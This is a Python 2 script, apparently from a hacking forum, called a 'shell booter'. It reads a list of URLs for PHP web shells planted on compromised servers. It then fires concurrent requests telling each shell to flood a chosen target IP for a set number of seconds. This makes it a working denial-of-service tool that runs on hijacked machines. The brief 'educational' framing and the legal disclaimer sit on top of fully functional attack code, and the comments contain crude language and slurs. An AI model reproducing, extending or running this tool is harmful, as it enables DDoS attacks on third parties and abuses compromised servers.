#!/usr/bin/env python
"""
# Python Shell Booter - Written by JoinSe7en

A friend of mine contacted me with a request to write up a simple shell booter in Python primarily for educational purposes since he's on the path of learning Python.
While this is still a very basic form of shell booter with no cool functions or flashy GUI i'd still like to post it if someone someday would be interested.

I'm sure there are better ways of doing this, no need to get buttmad about it. 
If you're python leet hax0r, please show us your ways.

Some things to note:
    I did not do any kind of argument parsing due to laziness, feel free to add it yourself.
    The Error Handling is god-awful. Don't care. It might throw an error while it's actually working, it won't affect the actual booting.

Only Tested on Debian.

"""

# legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. 
# It is the end user's responsibility to obey all applicable local, state and federal laws. 
# Developers assume no liability and are not responsible for any misuse or damage caused by this program.

from multiprocessing.pool import ThreadPool as Pool
import urllib2, sys

""" Configuration (because im too lazy to parse arguments) """

shellpath = "./getshells.txt" # /path/to/shells.txt
target    = "127.0.0.1"       # IP to boot (like a skid)
time 	  = 60		      # time to boot (like a skid)
timeout	  = time + 15	      # Timeout nigguh

""" End Of Configuration """


""" Globals """

# do not touch these u fkn cheeky kunt swear ill #rek u m8 swear on my mums life
counter = 0 
c_executed = 0

""" End of Globals """


""" Terminal Colors is cruise control for cool (fakk u winblows) """

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

if sys.platform == 'win32':
	bcolors.disable()

""" End of Terminal Colors """


def openShells(path):
	shells = []
	with open(path) as inputfile:
		for line in inputfile:
			shells.append(line.strip())

	print "[+] Loaded " + str(len(shells)) + " 'GET' Shells from " + path + "!"
	return shells



def bootIt(toexec, shell,target,time):
	global counter, c_executed
	print "[" + bcolors.OKBLUE + "+" + bcolors.ENDC + "] Executing: " + shell
	c_executed += 1
	if c_executed == toexec:
		print "\n\n"
	try:
		shellres = urllib2.urlopen(shell + "?act=phptools&host=" + target +"&time=" + str(time), timeout = timeout).read()
		print "[" + bcolors.OKGREEN + "+" + bcolors.ENDC + "] " + shell + "?act=phptools&host=" + target +"&time=" + str(time)
		counter += 1
	except urllib2.HTTPError, e:
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e.code) + ")"
		pass
	except urllib2.URLError, e:
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e.args) + ")"
		pass
	except:
		e = sys.exc_info()[0]
		print "[" + bcolors.FAIL + "!" + bcolors.ENDC + "] " + shell + " Failed. (" + bcolors.FAIL + "Error: " + bcolors.ENDC + str(e).strip("<class ") + ")"
		pass

def main():
	print "\n Target: " + target
	print "   Time: " + str(time)
	print ""
	shells = openShells(shellpath)
	# print shells

	pool = Pool(len(shells))

	
	print ""
	print bcolors.WARNING + "Warning: " + bcolors.ENDC + " When executed, this script will run until it's done."
	rusure = raw_input("Are you sure you wish to continue? [Y/n] ")
	if rusure.lower() == 'y':

		for shell in shells:
			pool.apply_async(bootIt, (len(shells), shell,target,time,))

		pool.close()
		pool.join()
		print "\n Working shells: " + str(counter) + "/" + str(len(shells))
		print " Booted '" + bcolors.OKGREEN + target + bcolors.ENDC + "' for '" + bcolors.OKGREEN + str(time) + bcolors.ENDC + "' seconds with '" + bcolors.OKGREEN + str(counter) + bcolors.ENDC + "' shells. (Like a skid)"
	else:
		print "Exiting..."


if __name__ == "__main__":
	try:
		main()
	except(KeyboardInterrupt):
		print bcolors.FAIL + "\nKeyboardInterrupt" + bcolors.ENDC + " detected."
		print "Exiting..."
		sys.exit()
